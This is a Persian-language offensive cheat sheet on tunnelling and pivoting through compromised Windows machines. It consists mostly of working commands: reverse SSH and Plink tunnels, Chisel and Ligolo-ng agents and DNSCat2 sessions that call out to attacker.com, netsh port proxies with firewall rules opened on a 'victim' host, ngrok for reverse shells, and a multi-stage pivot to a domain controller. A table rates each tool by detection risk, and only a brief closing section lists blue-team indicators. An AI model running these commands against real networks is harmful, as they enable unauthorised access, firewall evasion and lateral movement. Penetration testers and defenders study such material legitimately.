

# Windows Tunneling - راهنمای کامل

---

## ۱. SSH Tunneling در Windows

### SSH Client بومی (Windows 10+)

```powershell
# Local Port Forward
ssh -L 1433:192.168.1.10:1433 user@jumphost

# Remote Port Forward (Reverse Tunnel)
ssh -R 8080:localhost:80 user@attacker.com

# Dynamic SOCKS Proxy
ssh -D 1080 user@jumphost

# بدون TTY / در پس‌زمینه
ssh -N -f -D 1080 user@jumphost
```

### Plink (PuTTY CLI) - بدون نصب

```cmd
:: دانلود و اجرای مستقیم
plink.exe -ssh -N -R 4444:127.0.0.1:4444 user@attacker.com

:: بدون host key prompt (مهم برای automation)
plink.exe -ssh -N -batch -pw "password" \
  -R 4444:127.0.0.1:4444 user@attacker.com
```

---

## ۲. Chisel روی Windows

### راه‌اندازی

```bash
# روی Attacker (Linux):
./chisel server -p 8080 --reverse

# روی Windows Target:
.\chisel.exe client attacker.com:8080 R:1080:socks
# یا
.\chisel.exe client attacker.com:8080 R:4444:127.0.0.1:4444
```

### انواع حالت‌ها

```powershell
# SOCKS5 Proxy (کامل‌ترین)
.\chisel.exe client 10.10.10.1:8080 R:1080:socks

# Forward پورت خاص
.\chisel.exe client 10.10.10.1:8080 R:3389:127.0.0.1:3389

# چند tunnel همزمان
.\chisel.exe client 10.10.10.1:8080 `
  R:1080:socks `
  R:3389:192.168.1.5:3389 `
  R:445:192.168.1.5:445
```

---

## ۳. Ligolo-ng روی Windows

### معماری

Attacker (Kali)          Windows Target           Internal Network
┌─────────────┐          ┌─────────────┐          ┌─────────────┐
│  ligolo-ng  │◄─────────│   agent.exe │          │ 10.10.10.0/24│
│   proxy     │  tunnel  │             │──────────►│             │
│  tun0 iface │          │             │          │             │
└─────────────┘          └─────────────┘          └─────────────┘


### راه‌اندازی

```bash
# Attacker:
ip tuntap add user root mode tun ligolo
ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Windows Target (agent):
.\agent.exe -connect attacker.com:11601 -ignore-cert
```

# در پنجره proxy (interactive):
ligolo-ng » session          # انتخاب session
ligolo-ng » ifconfig         # دیدن شبکه‌های target
ligolo-ng » start            # شروع tunnel

# اضافه کردن route روی Kali:
ip route add 192.168.1.0/24 dev ligolo


### مزیت اصلی

ترافیک مستقیماً route می‌شود — نیازی به ProxyChains نیست:
```bash
nmap 192.168.1.0/24        # مستقیم بدون proxy
evil-winrm -i 192.168.1.5  # مستقیم
```

---

## ۴. Netsh Port Proxy (بومی Windows)

### بدون نیاز به ابزار خارجی

```cmd
:: Forward پورت محلی به مقصد دیگر
netsh interface portproxy add v4tov4 \
  listenport=4444 listenaddress=0.0.0.0 \
  connectport=4444 connectaddress=10.10.10.1

:: مشاهده قوانین فعال
netsh interface portproxy show all

:: حذف قانون
netsh interface portproxy delete v4tov4 \
  listenport=4444 listenaddress=0.0.0.0

:: پاک کردن همه
netsh interface portproxy reset
```

### مثال عملی - دسترسی به RDP داخلی

```cmd
:: از بیرون به سرور داخلی RDP بزن از طریق Windows قربانی
netsh interface portproxy add v4tov4 \
  listenport=33389 listenaddress=0.0.0.0 \
  connectport=3389 connectaddress=192.168.1.100

:: فایروال باز کن
netsh advfirewall firewall add rule \
  name="RDP Forward" protocol=TCP dir=in \
  localport=33389 action=allow
```

---

## ۵. Meterpreter Port Forward

meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.100
meterpreter > portfwd add -l 1433 -p 1433 -r 10.10.10.50
meterpreter > portfwd list
meterpreter > portfwd delete -l 3389
meterpreter > portfwd flush


---

## ۶. NGrok روی Windows

```powershell
# دانلود
Invoke-WebRequest -Uri "https://bin.equinox.io/..." -OutFile ngrok.zip
Expand-Archive ngrok.zip

# احراز هویت
.\ngrok.exe authtoken <token>

# TCP Tunnel برای Reverse Shell
.\ngrok.exe tcp 4444

# RDP از طریق NGrok
.\ngrok.exe tcp 3389
```

---

## ۷. DNSCat2 (DNS Tunneling)

### مناسب برای محیط‌های بسیار محدود

```bash
# Attacker (server):
ruby dnscat2.rb --dns port=5353,domain=tunnel.attacker.com --no-cache

# Windows Client:
.\dnscat2-v0.07-client-win32.exe tunnel.attacker.com
```

# در shell dnscat2:
dnscat2> session -i 1
command (victim) 1> shell
command (victim) 1> exec --name "cmd" cmd.exe

# Port Forward از طریق DNS:
command (victim) 1> listen 127.0.0.1:3389 192.168.1.5:3389


---

## ۸. ICMP Tunneling

### Hans / ptunnel-ng

```bash
# Attacker:
ptunnel-ng -R

# Windows Target (نیاز به admin):
ptunnel-ng.exe -p attacker.com -lp 8080 -da internal.host -dp 80
```

---

## ۹. ProxyChains روی Windows

### نسخه Windows: Proxifier یا ProxyCap

# proxychains4.conf معادل:
[ProxyList]
socks5 127.0.0.1 1080

# در Kali بعد از ایجاد SOCKS tunnel از Windows:
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains evil-winrm -i 192.168.1.5
proxychains crackmapexec smb 192.168.1.0/24


---

## ۱۰. Comparison Table

| ابزار | پروتکل | نیاز Admin | Detection Risk | بهترین کاربرد |
|-------|---------|------------|---------------|---------------|
| SSH (بومی) | TCP/22 | خیر | متوسط | jumphost ساده |
| Plink | TCP/22 | خیر | متوسط | automation |
| Chisel | HTTP/S | خیر | کم | bypass firewall |
| Ligolo-ng | TCP | خیر | کم | شبکه کامل |
| Netsh | TCP | **بله** | کم (بومی) | pivot بدون ابزار |
| Meterpreter | TCP | خیر | زیاد | داخل session |
| NGrok | HTTPS | خیر | زیاد | تست سریع |
| DNSCat2 | DNS | خیر | خیلی کم | محیط بسیار محدود |
| ICMP Tunnel | ICMP | **بله** | خیلی کم | فایروال سخت |

---

## سناریوی عملی: Pivoting چند مرحله‌ای

Kali ──► Windows1 (DMZ) ──► Windows2 (Internal) ──► DC (192.168.100.5)


```bash
# مرحله ۱: Chisel server روی Kali
./chisel server -p 8080 --reverse --socks5

# مرحله ۲: روی Windows1
.\chisel.exe client kali-ip:8080 R:1080:socks

# مرحله ۳: ProxyChains روی Kali به Windows2
proxychains evil-winrm -i 192.168.50.10 -u admin -p pass

# مرحله ۴: روی Windows2 - netsh به DC
netsh interface portproxy add v4tov4 \
  listenport=33389 listenaddress=0.0.0.0 \
  connectport=3389 connectaddress=192.168.100.5

# مرحله ۵: از Kali به DC از طریق tunnel
proxychains xfreerdp /v:192.168.50.10:33389 /u:admin
```

---

## Detection (Blue Team)

Event IDs مهم:
  4624 / 4625  - Logon از IP غیرمعمول
  5156         - Windows Filtering Platform (اتصال شبکه)
  7045         - نصب سرویس جدید (Chisel/Ligolo service)

Network Indicators:
  - اتصال outbound پایدار به IP خارجی
  - ترافیک HTTP با header غیرعادی
  - DNS query به دامنه‌های عجیب
  - پروتکل DNS با حجم بالای داده (DNSCat)

Registry:
  HKLM\SYSTEM\CurrentControlSet\Services\PortProxy
  (netsh portproxy اینجا ذخیره می‌کند)
